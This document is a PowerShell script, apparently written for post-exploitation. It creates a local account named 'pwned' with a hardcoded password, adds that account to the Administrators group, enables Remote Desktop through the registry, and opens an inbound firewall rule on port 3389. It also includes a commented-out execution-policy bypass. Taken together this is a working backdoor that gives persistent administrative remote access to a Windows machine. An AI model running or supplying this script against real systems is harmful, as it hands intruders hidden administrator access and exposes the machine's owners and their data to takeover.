#Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
#Get-ExecutionPolicy -Scope CurrentUser

# Define the password for the user
$Password = "YourSecurePassword123"

# Create the user 'pwned' with the specified password
Write-Host "Creating user 'pwned'..."
try {
    New-LocalUser -Name "pwned" -Password (ConvertTo-SecureString $Password -AsPlainText -Force) -FullName "pwned User" -Description "Automatically created user" -ErrorAction Stop
    Write-Host "User 'pwned' has been created."
} catch {
    Write-Host "User 'pwned' already exists or an error occurred."
}

# Add the user 'pwned' to the Administrators group
Write-Host "Adding user 'pwned' to the Administrators group..."
try {
    Add-LocalGroupMember -Group "Administrators" -Member "pwned" -ErrorAction Stop
    Write-Host "User 'pwned' has been added to the Administrators group."
} catch {
    Write-Host "User 'pwned' is already a member of the Administrators group or an error occurred."
}

# Enable Remote Desktop
Write-Host "Enabling Remote Desktop..."
try {
    Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" -Name "fDenyTSConnections" -Value 0 -ErrorAction Stop
    Write-Host "Remote Desktop has been enabled."
} catch {
    Write-Host "Failed to enable Remote Desktop or it is already enabled."
}

# Check if the firewall rule for RDP exists
$rdpRule = Get-NetFirewallRule -DisplayName "Remote Desktop" -ErrorAction SilentlyContinue

if ($rdpRule) {
    Write-Host "Firewall rule 'Remote Desktop' already exists. Skipping creation."
} else {
    Write-Host "Creating firewall rule for Remote Desktop..."
    try {
        New-NetFirewallRule -Name "RDP Rule" -DisplayName "Remote Desktop" -Protocol TCP -LocalPort 3389 -Action Allow -Direction Inbound -ErrorAction Stop
        Write-Host "Firewall rule for Remote Desktop has been created."
    } catch {
        Write-Host "An error occurred while creating the firewall rule for Remote Desktop."
    }
}

# Notify the user that all tasks have been completed
Write-Host "All tasks completed successfully."
